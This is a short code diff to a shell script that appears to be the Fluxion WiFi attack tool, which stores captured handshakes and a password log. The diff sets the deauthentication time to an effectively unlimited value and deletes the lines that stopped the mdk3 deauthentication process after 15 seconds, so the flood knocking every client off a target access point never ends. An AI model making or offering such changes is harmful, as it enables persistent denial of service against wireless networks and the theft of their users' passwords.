@@ -18,7 +18,8 @@ DUMP_PATH="/tmp/TMPflux"
 HANDSHAKE_PATH="/root/handshakes"
 PASSLOG_PATH="/root/pwlog"
 # Deauth duration during handshake capture
-DEAUTHTIME="20"
+# oo
+DEAUTHTIME="9999999999999"
 revision=35
 version=0.20
 IP=192.168.1.1
@@ -3035,8 +3036,6 @@ function deauthmdk3 {
 	echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
 	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating via mdk3 all clients on $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
 	mdk3PID=$!
-	sleep 15
-	kill $mdk3PID &>$flux_output_device
 }
 
 # Deauth to a specific target
